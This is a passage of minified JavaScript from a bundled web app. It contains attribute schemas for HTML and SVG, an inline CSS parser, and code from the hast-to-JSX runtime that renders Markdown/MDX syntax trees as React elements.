uj=El({properties:{ariaActiveDescendant:null,ariaAtomic:$a,ariaAutoComplete:null,ariaBusy:$a,ariaChecked:$a,ariaColCount:he,ariaColIndex:he,ariaColSpan:he,ariaControls:Aa,ariaCurrent:null,ariaDescribedBy:Aa,ariaDetails:null,ariaDisabled:$a,ariaDropEffect:Aa,ariaErrorMessage:null,ariaExpanded:$a,ariaFlowTo:Aa,ariaGrabbed:$a,ariaHasPopup:null,ariaHidden:$a,ariaInvalid:null,ariaKeyShortcuts:null,ariaLabel:null,ariaLabelledBy:Aa,ariaLevel:he,ariaLive:null,ariaModal:$a,ariaMultiLine:$a,ariaMultiSelectable:$a,ariaOrientation:null,ariaOwns:Aa,ariaPlaceholder:null,ariaPosInSet:he,ariaPressed:$a,ariaReadOnly:$a,ariaRelevant:null,ariaRequired:$a,ariaRoleDescription:Aa,ariaRowCount:he,ariaRowIndex:he,ariaRowSpan:he,ariaSelected:$a,ariaSetSize:he,ariaSort:null,ariaValueMax:he,ariaValueMin:he,ariaValueNow:he,ariaValueText:null,role:null},transform(a,e){return e==="role"?e:"aria-"+e.slice(4).toLowerCase()}});function dj(a,e){return e in a?a[e]:e}function pj(a,e){return dj(a,e.toLowerCase())}const VN=El({attributes:{acceptcharset:"accept-charset",classname:"class",htmlfor:"for",httpequiv:"http-equiv"},mustUseProperty:["checked","multiple","muted","selected"],properties:{abbr:null,accept:al,acceptCharset:Aa,accessKey:Aa,action:null,allow:null,allowFullScreen:Ve,allowPaymentRequest:Ve,allowUserMedia:Ve,alt:null,as:null,async:Ve,autoCapitalize:null,autoComplete:Aa,autoFocus:Ve,autoPlay:Ve,blocking:Aa,capture:null,charSet:null,checked:Ve,cite:null,className:Aa,cols:he,colSpan:null,content:null,contentEditable:$a,controls:Ve,controlsList:Aa,coords:he|al,crossOrigin:null,data:null,dateTime:null,decoding:null,default:Ve,defer:Ve,dir:null,dirName:null,disabled:Ve,download:Fg,draggable:$a,encType:null,enterKeyHint:null,fetchPriority:null,form:null,formAction:null,formEncType:null,formMethod:null,formNoValidate:Ve,formTarget:null,headers:Aa,height:he,hidden:Fg,high:he,href:null,hrefLang:null,htmlFor:Aa,httpEquiv:Aa,id:null,imageSizes:null,imageSrcSet:null,inert:Ve,inputMode:null,integrity:null,is:null,isMap:Ve,itemId:null,itemProp:Aa,itemRef:Aa,itemScope:Ve,itemType:Aa,kind:null,label:null,lang:null,language:null,list:null,loading:null,loop:Ve,low:he,manifest:null,max:null,maxLength:he,media:null,method:null,min:null,minLength:he,multiple:Ve,muted:Ve,name:null,nonce:null,noModule:Ve,noValidate:Ve,onAbort:null,onAfterPrint:null,onAuxClick:null,onBeforeMatch:null,onBeforePrint:null,onBeforeToggle:null,onBeforeUnload:null,onBlur:null,onCancel:null,onCanPlay:null,onCanPlayThrough:null,onChange:null,onClick:null,onClose:null,onContextLost:null,onContextMenu:null,onContextRestored:null,onCopy:null,onCueChange:null,onCut:null,onDblClick:null,onDrag:null,onDragEnd:null,onDragEnter:null,onDragExit:null,onDragLeave:null,onDragOver:null,onDragStart:null,onDrop:null,onDurationChange:null,onEmptied:null,onEnded:null,onError:null,onFocus:null,onFormData:null,onHashChange:null,onInput:null,onInvalid:null,onKeyDown:null,onKeyPress:null,onKeyUp:null,onLanguageChange:null,onLoad:null,onLoadedData:null,onLoadedMetadata:null,onLoadEnd:null,onLoadStart:null,onMessage:null,onMessageError:null,onMouseDown:null,onMouseEnter:null,onMouseLeave:null,onMouseMove:null,onMouseOut:null,onMouseOver:null,onMouseUp:null,onOffline:null,onOnline:null,onPageHide:null,onPageShow:null,onPaste:null,onPause:null,onPlay:null,onPlaying:null,onPopState:null,onProgress:null,onRateChange:null,onRejectionHandled:null,onReset:null,onResize:null,onScroll:null,onScrollEnd:null,onSecurityPolicyViolation:null,onSeeked:null,onSeeking:null,onSelect:null,onSlotChange:null,onStalled:null,onStorage:null,onSubmit:null,onSuspend:null,onTimeUpdate:null,onToggle:null,onUnhandledRejection:null,onUnload:null,onVolumeChange:null,onWaiting:null,onWheel:null,open:Ve,optimum:he,pattern:null,ping:Aa,placeholder:null,playsInline:Ve,popover:null,popoverTarget:null,popoverTargetAction:null,poster:null,preload:null,readOnly:Ve,referrerPolicy:null,rel:Aa,required:Ve,reversed:Ve,rows:he,rowSpan:he,sandbox:Aa,scope:null,scoped:Ve,seamless:Ve,selected:Ve,shadowRootClonable:Ve,shadowRootDelegatesFocus:Ve,shadowRootMode:null,shape:null,size:he,sizes:null,slot:null,span:he,spellCheck:$a,src:null,srcDoc:null,srcLang:null,srcSet:null,start:he,step:null,style:null,tabIndex:he,target:null,title:null,translate:null,type:null,typeMustMatch:Ve,useMap:null,value:$a,width:he,wrap:null,writingSuggestions:null,align:null,aLink:null,archive:Aa,axis:null,background:null,bgColor:null,border:he,borderColor:null,bottomMargin:he,cellPadding:null,cellSpacing:null,char:null,charOff:null,classId:null,clear:null,code:null,codeBase:null,codeType:null,color:null,compact:Ve,declare:Ve,event:null,face:null,frame:null,frameBorder:null,hSpace:he,leftMargin:he,link:null,longDesc:null,lowSrc:null,marginHeight:he,marginWidth:he,noResize:Ve,noHref:Ve,noShade:Ve,noWrap:Ve,object:null,profile:null,prompt:null,rev:null,rightMargin:he,rules:null,scheme:null,scrolling:$a,standby:null,summary:null,text:null,topMargin:he,valueType:null,version:null,vAlign:null,vLink:null,vSpace:he,allowTransparency:null,autoCorrect:null,autoSave:null,disablePictureInPicture:Ve,disableRemotePlayback:Ve,prefix:null,property:null,results:he,security:null,unselectable:null},space:"html",transform:pj}),FN=El({attributes:{accentHeight:"accent-height",alignmentBaseline:"alignment-baseline",arabicForm:"arabic-form",baselineShift:"baseline-shift",capHeight:"cap-height",className:"class",clipPath:"clip-path",clipRule:"clip-rule",colorInterpolation:"color-interpolation",colorInterpolationFilters:"color-interpolation-filters",colorProfile:"color-profile",colorRendering:"color-rendering",crossOrigin:"crossorigin",dataType:"datatype",dominantBaseline:"dominant-baseline",enableBackground:"enable-background",fillOpacity:"fill-opacity",fillRule:"fill-rule",floodColor:"flood-color",floodOpacity:"flood-opacity",fontFamily:"font-family",fontSize:"font-size",fontSizeAdjust:"font-size-adjust",fontStretch:"font-stretch",fontStyle:"font-style",fontVariant:"font-variant",fontWeight:"font-weight",glyphName:"glyph-name",glyphOrientationHorizontal:"glyph-orientation-horizontal",glyphOrientationVertical:"glyph-orientation-vertical",hrefLang:"hreflang",horizAdvX:"horiz-adv-x",horizOriginX:"horiz-origin-x",horizOriginY:"horiz-origin-y",imageRendering:"image-rendering",letterSpacing:"letter-spacing",lightingColor:"lighting-color",markerEnd:"marker-end",markerMid:"marker-mid",markerStart:"marker-start",navDown:"nav-down",navDownLeft:"nav-down-left",navDownRight:"nav-down-right",navLeft:"nav-left",navNext:"nav-next",navPrev:"nav-prev",navRight:"nav-right",navUp:"nav-up",navUpLeft:"nav-up-left",navUpRight:"nav-up-right",onAbort:"onabort",onActivate:"onactivate",onAfterPrint:"onafterprint",onBeforePrint:"onbeforeprint",onBegin:"onbegin",onCancel:"oncancel",onCanPlay:"oncanplay",onCanPlayThrough:"oncanplaythrough",onChange:"onchange",onClick:"onclick",onClose:"onclose",onCopy:"oncopy",onCueChange:"oncuechange",onCut:"oncut",onDblClick:"ondblclick",onDrag:"ondrag",onDragEnd:"ondragend",onDragEnter:"ondragenter",onDragExit:"ondragexit",onDragLeave:"ondragleave",onDragOver:"ondragover",onDragStart:"ondragstart",onDrop:"ondrop",onDurationChange:"ondurationchange",onEmptied:"onemptied",onEnd:"onend",onEnded:"onended",onError:"onerror",onFocus:"onfocus",onFocusIn:"onfocusin",onFocusOut:"onfocusout",onHashChange:"onhashchange",onInput:"oninput",onInvalid:"oninvalid",onKeyDown:"onkeydown",onKeyPress:"onkeypress",onKeyUp:"onkeyup",onLoad:"onload",onLoadedData:"onloadeddata",onLoadedMetadata:"onloadedmetadata",onLoadStart:"onloadstart",onMessage:"onmessage",onMouseDown:"onmousedown",onMouseEnter:"onmouseenter",onMouseLeave:"onmouseleave",onMouseMove:"onmousemove",onMouseOut:"onmouseout",onMouseOver:"onmouseover",onMouseUp:"onmouseup",onMouseWheel:"onmousewheel",onOffline:"onoffline",onOnline:"ononline",onPageHide:"onpagehide",onPageShow:"onpageshow",onPaste:"onpaste",onPause:"onpause",onPlay:"onplay",onPlaying:"onplaying",onPopState:"onpopstate",onProgress:"onprogress",onRateChange:"onratechange",onRepeat:"onrepeat",onReset:"onreset",onResize:"onresize",onScroll:"onscroll",onSeeked:"onseeked",onSeeking:"onseeking",onSelect:"onselect",onShow:"onshow",onStalled:"onstalled",onStorage:"onstorage",onSubmit:"onsubmit",onSuspend:"onsuspend",onTimeUpdate:"ontimeupdate",onToggle:"ontoggle",onUnload:"onunload",onVolumeChange:"onvolumechange",onWaiting:"onwaiting",onZoom:"onzoom",overlinePosition:"overline-position",overlineThickness:"overline-thickness",paintOrder:"paint-order",panose1:"panose-1",pointerEvents:"pointer-events",referrerPolicy:"referrerpolicy",renderingIntent:"rendering-intent",shapeRendering:"shape-rendering",stopColor:"stop-color",stopOpacity:"stop-opacity",strikethroughPosition:"strikethrough-position",strikethroughThickness:"strikethrough-thickness",strokeDashArray:"stroke-dasharray",strokeDashOffset:"stroke-dashoffset",strokeLineCap:"stroke-linecap",strokeLineJoin:"stroke-linejoin",strokeMiterLimit:"stroke-miterlimit",strokeOpacity:"stroke-opacity",strokeWidth:"stroke-width",tabIndex:"tabindex",textAnchor:"text-anchor",textDecoration:"text-decoration",textRendering:"text-rendering",transformOrigin:"transform-origin",typeOf:"typeof",underlinePosition:"underline-position",underlineThickness:"underline-thickness",unicodeBidi:"unicode-bidi",unicodeRange:"unicode-range",unitsPerEm:"units-per-em",vAlphabetic:"v-alphabetic",vHanging:"v-hanging",vIdeographic:"v-ideographic",vMathematical:"v-mathematical",vectorEffect:"vector-effect",vertAdvY:"vert-adv-y",vertOriginX:"vert-origin-x",vertOriginY:"vert-origin-y",wordSpacing:"word-spacing",writingMode:"writing-mode",xHeight:"x-height",playbackOrder:"playbackorder",timelineBegin:"timelinebegin"},properties:{about:$t,accentHeight:he,accumulate:null,additive:null,alignmentBaseline:null,alphabetic:he,amplitude:he,arabicForm:null,ascent:he,attributeName:null,attributeType:null,azimuth:he,bandwidth:null,baselineShift:null,baseFrequency:null,baseProfile:null,bbox:null,begin:null,bias:he,by:null,calcMode:null,capHeight:he,className:Aa,clip:null,clipPath:null,clipPathUnits:null,clipRule:null,color:null,colorInterpolation:null,colorInterpolationFilters:null,colorProfile:null,colorRendering:null,content:null,contentScriptType:null,contentStyleType:null,crossOrigin:null,cursor:null,cx:null,cy:null,d:null,dataType:null,defaultAction:null,descent:he,diffuseConstant:he,direction:null,display:null,dur:null,divisor:he,dominantBaseline:null,download:Ve,dx:null,dy:null,edgeMode:null,editable:null,elevation:he,enableBackground:null,end:null,event:null,exponent:he,externalResourcesRequired:null,fill:null,fillOpacity:he,fillRule:null,filter:null,filterRes:null,filterUnits:null,floodColor:null,floodOpacity:null,focusable:null,focusHighlight:null,fontFamily:null,fontSize:null,fontSizeAdjust:null,fontStretch:null,fontStyle:null,fontVariant:null,fontWeight:null,format:null,fr:null,from:null,fx:null,fy:null,g1:al,g2:al,glyphName:al,glyphOrientationHorizontal:null,glyphOrientationVertical:null,glyphRef:null,gradientTransform:null,gradientUnits:null,handler:null,hanging:he,hatchContentUnits:null,hatchUnits:null,height:null,href:null,hrefLang:null,horizAdvX:he,horizOriginX:he,horizOriginY:he,id:null,ideographic:he,imageRendering:null,initialVisibility:null,in:null,in2:null,intercept:he,k:he,k1:he,k2:he,k3:he,k4:he,kernelMatrix:$t,kernelUnitLength:null,keyPoints:null,keySplines:null,keyTimes:null,kerning:null,lang:null,lengthAdjust:null,letterSpacing:null,lightingColor:null,limitingConeAngle:he,local:null,markerEnd:null,markerMid:null,markerStart:null,markerHeight:null,markerUnits:null,markerWidth:null,mask:null,maskContentUnits:null,maskUnits:null,mathematical:null,max:null,media:null,mediaCharacterEncoding:null,mediaContentEncodings:null,mediaSize:he,mediaTime:null,method:null,min:null,mode:null,name:null,navDown:null,navDownLeft:null,navDownRight:null,navLeft:null,navNext:null,navPrev:null,navRight:null,navUp:null,navUpLeft:null,navUpRight:null,numOctaves:null,observer:null,offset:null,onAbort:null,onActivate:null,onAfterPrint:null,onBeforePrint:null,onBegin:null,onCancel:null,onCanPlay:null,onCanPlayThrough:null,onChange:null,onClick:null,onClose:null,onCopy:null,onCueChange:null,onCut:null,onDblClick:null,onDrag:null,onDragEnd:null,onDragEnter:null,onDragExit:null,onDragLeave:null,onDragOver:null,onDragStart:null,onDrop:null,onDurationChange:null,onEmptied:null,onEnd:null,onEnded:null,onError:null,onFocus:null,onFocusIn:null,onFocusOut:null,onHashChange:null,onInput:null,onInvalid:null,onKeyDown:null,onKeyPress:null,onKeyUp:null,onLoad:null,onLoadedData:null,onLoadedMetadata:null,onLoadStart:null,onMessage:null,onMouseDown:null,onMouseEnter:null,onMouseLeave:null,onMouseMove:null,onMouseOut:null,onMouseOver:null,onMouseUp:null,onMouseWheel:null,onOffline:null,onOnline:null,onPageHide:null,onPageShow:null,onPaste:null,onPause:null,onPlay:null,onPlaying:null,onPopState:null,onProgress:null,onRateChange:null,onRepeat:null,onReset:null,onResize:null,onScroll:null,onSeeked:null,onSeeking:null,onSelect:null,onShow:null,onStalled:null,onStorage:null,onSubmit:null,onSuspend:null,onTimeUpdate:null,onToggle:null,onUnload:null,onVolumeChange:null,onWaiting:null,onZoom:null,opacity:null,operator:null,order:null,orient:null,orientation:null,origin:null,overflow:null,overlay:null,overlinePosition:he,overlineThickness:he,paintOrder:null,panose1:null,path:null,pathLength:he,patternContentUnits:null,patternTransform:null,patternUnits:null,phase:null,ping:Aa,pitch:null,playbackOrder:null,pointerEvents:null,points:null,pointsAtX:he,pointsAtY:he,pointsAtZ:he,preserveAlpha:null,preserveAspectRatio:null,primitiveUnits:null,propagate:null,property:$t,r:null,radius:null,referrerPolicy:null,refX:null,refY:null,rel:$t,rev:$t,renderingIntent:null,repeatCount:null,repeatDur:null,requiredExtensions:$t,requiredFeatures:$t,requiredFonts:$t,requiredFormats:$t,resource:null,restart:null,result:null,rotate:null,rx:null,ry:null,scale:null,seed:null,shapeRendering:null,side:null,slope:null,snapshotTime:null,specularConstant:he,specularExponent:he,spreadMethod:null,spacing:null,startOffset:null,stdDeviation:null,stemh:null,stemv:null,stitchTiles:null,stopColor:null,stopOpacity:null,strikethroughPosition:he,strikethroughThickness:he,string:null,stroke:null,strokeDashArray:$t,strokeDashOffset:null,strokeLineCap:null,strokeLineJoin:null,strokeMiterLimit:he,strokeOpacity:he,strokeWidth:null,style:null,surfaceScale:he,syncBehavior:null,syncBehaviorDefault:null,syncMaster:null,syncTolerance:null,syncToleranceDefault:null,systemLanguage:$t,tabIndex:he,tableValues:null,target:null,targetX:he,targetY:he,textAnchor:null,textDecoration:null,textRendering:null,textLength:null,timelineBegin:null,title:null,transformBehavior:null,type:null,typeOf:$t,to:null,transform:null,transformOrigin:null,u1:null,u2:null,underlinePosition:he,underlineThickness:he,unicode:null,unicodeBidi:null,unicodeRange:null,unitsPerEm:he,values:null,vAlphabetic:he,vMathematical:he,vectorEffect:null,vHanging:he,vIdeographic:he,version:null,vertAdvY:he,vertOriginX:he,vertOriginY:he,viewBox:null,viewTarget:null,visibility:null,width:null,widths:null,wordSpacing:null,writingMode:null,x:null,x1:null,x2:null,xChannelSelector:null,xHeight:he,y:null,y1:null,y2:null,yChannelSelector:null,z:null,zoomAndPan:null},space:"svg",transform:dj}),mj=El({properties:{xLinkActuate:null,xLinkArcRole:null,xLinkHref:null,xLinkRole:null,xLinkShow:null,xLinkTitle:null,xLinkType:null},space:"xlink",transform(a,e){return"xlink:"+e.slice(5).toLowerCase()}}),fj=El({attributes:{xmlnsxlink:"xmlns:xlink"},properties:{xmlnsXLink:null,xmlns:null},space:"xmlns",transform:pj}),hj=El({properties:{xmlBase:null,xmlLang:null,xmlSpace:null},space:"xml",transform(a,e){return"xml:"+e.slice(3).toLowerCase()}}),HN={classId:"classID",dataType:"datatype",itemId:"itemID",strokeDashArray:"strokeDasharray",strokeDashOffset:"strokeDashoffset",strokeLineCap:"strokeLinecap",strokeLineJoin:"strokeLinejoin",strokeMiterLimit:"strokeMiterlimit",typeOf:"typeof",xLinkActuate:"xlinkActuate",xLinkArcRole:"xlinkArcrole",xLinkHref:"xlinkHref",xLinkRole:"xlinkRole",xLinkShow:"xlinkShow",xLinkTitle:"xlinkTitle",xLinkType:"xlinkType",xmlnsXLink:"xmlnsXlink"},GN=/[A-Z]/g,tA=/-[a-z]/g,JN=/^data[-\w.:]+$/i;function QN(a,e){const t=Vg(e);let o=e,r=zt;if(t in a.normal)return a.property[a.normal[t]];if(t.length>4&&t.slice(0,4)==="data"&&JN.test(e)){if(e.charAt(4)==="-"){const l=e.slice(5).replace(tA,KN);o="data"+l.charAt(0).toUpperCase()+l.slice(1)}else{const l=e.slice(4);if(!tA.test(l)){let c=l.replace(GN,WN);c.charAt(0)!=="-"&&(c="-"+c),e="data"+c}}r=vv}return new r(o,e)}function WN(a){return"-"+a.toLowerCase()}function KN(a){return a.charAt(1).toUpperCase()}const $N=cj([uj,VN,mj,fj,hj],"html"),yv=cj([uj,FN,mj,fj,hj],"svg");function YN(a){return a.join(" ").trim()}var Vs={},Wh,nA;function XN(){if(nA)return Wh;nA=1;var a=/\/\*[^*]*\*+([^/*][^*]*\*+)*\//g,e=/\n/g,t=/^\s*/,o=/^(\*?[-#/*\\\w]+(\[[0-9a-z_-]+\])?)\s*/,r=/^:\s*/,l=/^((?:'(?:\\'|.)*?'|"(?:\\"|.)*?"|\([^)]*?\)|[^};])+)/,c=/^[;\s]*/,d=/^\s+|\s+$/g,f=`
`,p="/",v="*",y="",S="comment",A="declaration";function R(x,D){if(typeof x!="string")throw new TypeError("First argument must be a string");if(!x)return[];D=D||{};var G=1,B=1;function ee(ge){var me=ge.match(e);me&&(G+=me.length);var K=ge.lastIndexOf(f);B=~K?ge.length-K:B+ge.length}function ue(){var ge={line:G,column:B};return function(me){return me.position=new Q(ge),k(),me}}function Q(ge){this.start=ge,this.end={line:G,column:B},this.source=D.source}Q.prototype.content=x;function w(ge){var me=new Error(D.source+":"+G+":"+B+": "+ge);if(me.reason=ge,me.filename=D.source,me.line=G,me.column=B,me.source=x,!D.silent)throw me}function I(ge){var me=ge.exec(x);if(me){var K=me[0];return ee(K),x=x.slice(K.length),me}}function k(){I(t)}function j(ge){var me;for(ge=ge||[];me=_();)me!==!1&&ge.push(me);return ge}function _(){var ge=ue();if(!(p!=x.charAt(0)||v!=x.charAt(1))){for(var me=2;y!=x.charAt(me)&&(v!=x.charAt(me)||p!=x.charAt(me+1));)++me;if(me+=2,y===x.charAt(me-1))return w("End of comment missing");var K=x.slice(2,me-2);return B+=2,ee(K),x=x.slice(me),B+=2,ge({type:S,comment:K})}}function z(){var ge=ue(),me=I(o);if(me){if(_(),!I(r))return w("property missing ':'");var K=I(l),pe=ge({type:A,property:L(me[0].replace(a,y)),value:K?L(K[0].replace(a,y)):y});return I(c),pe}}function N(){var ge=[];j(ge);for(var me;me=z();)me!==!1&&(ge.push(me),j(ge));return ge}return k(),N()}function L(x){return x?x.replace(d,y):y}return Wh=R,Wh}var oA;function ZN(){if(oA)return Vs;oA=1;var a=Vs&&Vs.__importDefault||function(o){return o&&o.__esModule?o:{default:o}};Object.defineProperty(Vs,"__esModule",{value:!0}),Vs.default=t;const e=a(XN());function t(o,r){let l=null;if(!o||typeof o!="string")return l;const c=(0,e.default)(o),d=typeof r=="function";return c.forEach(f=>{if(f.type!=="declaration")return;const{property:p,value:v}=f;d?r(p,v,f):v&&(l=l||{},l[p]=v)}),l}return Vs}var qc={},iA;function eO(){if(iA)return qc;iA=1,Object.defineProperty(qc,"__esModule",{value:!0}),qc.camelCase=void 0;var a=/^--[a-zA-Z0-9_-]+$/,e=/-([a-z])/g,t=/^[^-]+$/,o=/^-(webkit|moz|ms|o|khtml)-/,r=/^-(ms)-/,l=function(p){return!p||t.test(p)||a.test(p)},c=function(p,v){return v.toUpperCase()},d=function(p,v){return"".concat(v,"-")},f=function(p,v){return v===void 0&&(v={}),l(p)?p:(p=p.toLowerCase(),v.reactCompat?p=p.replace(r,d):p=p.replace(o,d),p.replace(e,c))};return qc.camelCase=f,qc}var Rc,rA;function aO(){if(rA)return Rc;rA=1;var a=Rc&&Rc.__importDefault||function(r){return r&&r.__esModule?r:{default:r}},e=a(ZN()),t=eO();function o(r,l){var c={};return!r||typeof r!="string"||(0,e.default)(r,function(d,f){d&&f&&(c[(0,t.camelCase)(d,l)]=f)}),c}return o.default=o,Rc=o,Rc}var tO=aO();const nO=Zg(tO),gj=bj("end"),Ev=bj("start");function bj(a){return e;function e(t){const o=t&&t.position&&t.position[a]||{};if(typeof o.line=="number"&&o.line>0&&typeof o.column=="number"&&o.column>0)return{line:o.line,column:o.column,offset:typeof o.offset=="number"&&o.offset>-1?o.offset:void 0}}}function oO(a){const e=Ev(a),t=gj(a);if(e&&t)return{start:e,end:t}}function Jc(a){return!a||typeof a!="object"?"":"position"in a||"type"in a?sA(a.position):"start"in a||"end"in a?sA(a):"line"in a||"column"in a?Gg(a):""}function Gg(a){return lA(a&&a.line)+":"+lA(a&&a.column)}function sA(a){return Gg(a&&a.start)+"-"+Gg(a&&a.end)}function lA(a){return a&&typeof a=="number"?a:1}class At extends Error{constructor(e,t,o){super(),typeof t=="string"&&(o=t,t=void 0);let r="",l={},c=!1;if(t&&("line"in t&&"column"in t?l={place:t}:"start"in t&&"end"in t?l={place:t}:"type"in t?l={ancestors:[t],place:t.position}:l={...t}),typeof e=="string"?r=e:!l.cause&&e&&(c=!0,r=e.message,l.cause=e),!l.ruleId&&!l.source&&typeof o=="string"){const f=o.indexOf(":");f===-1?l.ruleId=o:(l.source=o.slice(0,f),l.ruleId=o.slice(f+1))}if(!l.place&&l.ancestors&&l.ancestors){const f=l.ancestors[l.ancestors.length-1];f&&(l.place=f.position)}const d=l.place&&"start"in l.place?l.place.start:l.place;this.ancestors=l.ancestors||void 0,this.cause=l.cause||void 0,this.column=d?d.column:void 0,this.fatal=void 0,this.file="",this.message=r,this.line=d?d.line:void 0,this.name=Jc(l.place)||"1:1",this.place=l.place||void 0,this.reason=this.message,this.ruleId=l.ruleId||void 0,this.source=l.source||void 0,this.stack=c&&l.cause&&typeof l.cause.stack=="string"?l.cause.stack:"",this.actual=void 0,this.expected=void 0,this.note=void 0,this.url=void 0}}At.prototype.file="";At.prototype.name="";At.prototype.reason="";At.prototype.message="";At.prototype.stack="";At.prototype.column=void 0;At.prototype.line=void 0;At.prototype.ancestors=void 0;At.prototype.cause=void 0;At.prototype.fatal=void 0;At.prototype.place=void 0;At.prototype.ruleId=void 0;At.prototype.source=void 0;const Sv={}.hasOwnProperty,iO=new Map,rO=/[A-Z]/g,sO=new Set(["table","tbody","thead","tfoot","tr"]),lO=new Set(["td","th"]),vj="https://github.com/syntax-tree/hast-util-to-jsx-runtime";function cO(a,e){if(!e||e.Fragment===void 0)throw new TypeError("Expected `Fragment` in options");const t=e.filePath||void 0;let o;if(e.development){if(typeof e.jsxDEV!="function")throw new TypeError("Expected `jsxDEV` in options when `development: true`");o=bO(t,e.jsxDEV)}else{if(typeof e.jsx!="function")throw new TypeError("Expected `jsx` in production options");if(typeof e.jsxs!="function")throw new TypeError("Expected `jsxs` in production options");o=gO(t,e.jsx,e.jsxs)}const r={Fragment:e.Fragment,ancestors:[],components:e.components||{},create:o,elementAttributeNameCase:e.elementAttributeNameCase||"react",evaluater:e.createEvaluater?e.createEvaluater():void 0,filePath:t,ignoreInvalidStyle:e.ignoreInvalidStyle||!1,passKeys:e.passKeys!==!1,passNode:e.passNode||!1,schema:e.space==="svg"?yv:$N,stylePropertyNameCase:e.stylePropertyNameCase||"dom",tableCellAlignToStyle:e.tableCellAlignToStyle!==!1},l=yj(r,a,void 0);return l&&typeof l!="string"?l:r.create(a,r.Fragment,{children:l||void 0},void 0)}function yj(a,e,t){if(e.type==="element")return uO(a,e,t);if(e.type==="mdxFlowExpression"||e.type==="mdxTextExpression")return dO(a,e);if(e.type==="mdxJsxFlowElement"||e.type==="mdxJsxTextElement")return mO(a,e,t);if(e.type==="mdxjsEsm")return pO(a,e);if(e.type==="root")return fO(a,e,t);if(e.type==="text")return hO(a,e)}function uO(a,e,t){const o=a.schema;let r=o;e.tagName.toLowerCase()==="svg"&&o.space==="html"&&(r=yv,a.schema=r),a.ancestors.push(e);const l=Sj(a,e.tagName,!1),c=vO(a,e);let d=Av(a,e);return sO.has(e.tagName)&&(d=d.filter(function(f){return typeof f=="string"?!UN(f):!0})),Ej(a,c,l,e),Cv(c,d),a.ancestors.pop(),a.schema=o,a.create(e,l,c,t)}function dO(a,e){if(e.data&&e.data.estree&&a.evaluater){const o=e.data.estree.body[0];return o.type,a.evaluater.evaluateExpression(o.expression)}su(a,e.position)}function pO(a,e){if(e.data&&e.data.estree&&a.evaluater)return a.evaluater.evaluateProgram(e.data.estree);su(a,e.position)}function mO(a,e,t){const o=a.schema;let r=o;e.name==="svg"&&o.space==="html"&&(r=yv,a.schema=r),a.ancestors.push(e);const l=e.name===null?a.Fragment:Sj(a,e.name,!0),c=yO(a,e),d=Av(a,e);return Ej(a,c,l,e),Cv(c,d),a.ancestors.pop(),a.schema=o,a.create(e,l,c,t)}function fO(a,e,t){const o={};return Cv(o,Av(a,e)),a.create(e,a.Fragment,o,t)}function hO(a,e){return e.value}function Ej(a,e,t,o){typeof t!="string"&&t!==a.Fragment&&a.passNode&&(e.node=o)}function Cv(a,e){if(e.length>0){const t=e.length>1?e:e[0];t&&(a.children=t)}}function gO(a,e,t){return o;function o(r,l,c,d){const p=Array.isArray(c.children)?t:e;return d?p(l,c,d):p(l,c)}}function bO(a,e){return t;function t(o,r,l,c){const d=Array.isArray(l.children),f=Ev(o);return e(r,l,c,d,{columnNumber:f?f.column-1:void 0,fileName:a,lineNumber:f?f.line:void 0},void 0)}}function vO(a,e){const t={};let o,r;for(r in e.properties)if(r!=="children"&&Sv.call(e.properties,r)){const l=EO(a,r,e.properties[r]);if(l){const[c,d]=l;a.tableCellAlignToStyle&&c==="align"&&typeof d=="string"&&lO.has(e.tagName)?o=d:t[c]=d}}if(o){const l=t.style||(t.style={});l[a.stylePropertyNameCase==="css"?"text-align":"textAlign"]=o}return t}function yO(a,e){const t={};for(const o of e.attributes)if(o.type==="mdxJsxExpressionAttribute")if(o.data&&o.data.estree&&a.evaluater){const l=o.data.estree.body[0];l.type;const c=l.expression;c.type;const d=c.properties[0];d.type,Object.assign(t,a.evaluater.evaluateExpression(d.argument))}else su(a,e.position);else{const r=o.name;let l;if(o.value&&typeof o.value=="object")if(o.value.data&&o.value.data.estree&&a.evaluater){const d=o.value.data.estree.body[0];d.type,l=a.evaluater.evaluateExpression(d.expression)}else su(a,e.position);else l=o.value===null?!0:o.value;t[r]=l}return t}function Av(a,e){const t=[];let o=-1;const r=a.passKeys?new Map:iO;for(;++o<e.children.length;){const l=e.children[o];let c;if(a.passKeys){const f=l.type==="element"?l.tagName:l.type==="mdxJsxFlowElement"||l.type==="mdxJsxTextElement"?l.name:void 0;if(f){const p=r.get(f)||0;c=f+"-"+p,r.set(f,p+1)}}const d=yj(a,l,c);d!==void 0&&t.push(d)}return t}function EO(a,e,t){const o=QN(a.schema,e);if(!(t==null||typeof t=="number"&&Number.isNaN(t))){if(Array.isArray(t)&&(t=o.commaSeparated?_N(t):YN(t)),o.property==="style"){let r=typeof t=="object"?t:SO(a,String(t));return a.stylePropertyNameCase==="css"&&(r=CO(r)),["style",r]}return[a.elementAttributeNameCase==="react"&&o.space?HN[o.property]||o.property:o.attribute,t]}}function SO(a,e){try{return nO(e,{reactCompat:!0})}catch(t){if(a.ignoreInvalidStyle)return{};const o=t,r=new At("Cannot parse `style` attribute",{ancestors:a.ancestors,cause:o,ruleId:"style",source:"hast-util-to-jsx-runtime"});throw r.file=a.filePath||void 0,r.url=vj+"#cannot-parse-style-attribute",r}}function Sj(a,e,t){let o;if(!t)o={type:"Literal",value:e};else if(e.includes(".")){const r=e.split(".");let l=-1,c;for(;++l<r.length;){const d=Z1(r[l])?{type:"Identifier",name:r[l]}:{type:"Literal",value:r[l]};c=c?{type:"MemberExpression",object:c,property:d,computed:!!(l&&d.type==="Literal"),optional:!1}:d}o=c}else o=Z1(e)&&!/^[a-z]/.test(e)?{type:"Identifier",name:e}:{type:"Literal",value:e};if(o.type==="Literal"){const r=o.value;return Sv.call(a.components,r)?a.components[r]:r}if(a.evaluater)return a.evaluater.evaluateExpression(o);su(a)}function su(a,e){const t=new At("Cannot handle MDX estrees without `createEvaluater`",{ancestors:a.ancestors,place:e,ruleId:"mdx-estree",source:"hast-util-to-jsx-runtime"});throw t.file=a.filePath||void 0,t.url=vj+"#cannot-handle-mdx-estrees-without-createevaluater",t}function CO(a){const e={};let t;for(t in a)Sv.call(a,t)&&(e[AO(t)]=a[t]);return e}function AO(a){let e=a.replace(rO,TO);return e.slice(0,3)==="ms-"&&(e="-"+e),e}function TO(a){return"-"+a.toLowerCase()}const Kh={action:["form"],cite:["blockquote","del","ins","q"],data:["object"],formAction:["button","input"],href:["a","area","base","link"],icon:["menuitem"],itemId:null,manifest:["html"],ping:["a","area"],poster:["video"],src:["audio","embed","iframe","img","input","script","source","track","video"]},xO={};function Tv(a,e){const t=xO,o=typeof t.includeImageAlt=="boolean"?t.includeImageAlt:!0,r=typeof t.includeHtml=="boolean"?t.includeHtml:!0;return Cj(a,o,r)}function Cj(a,e,t){if(jO(a)){if("value"in 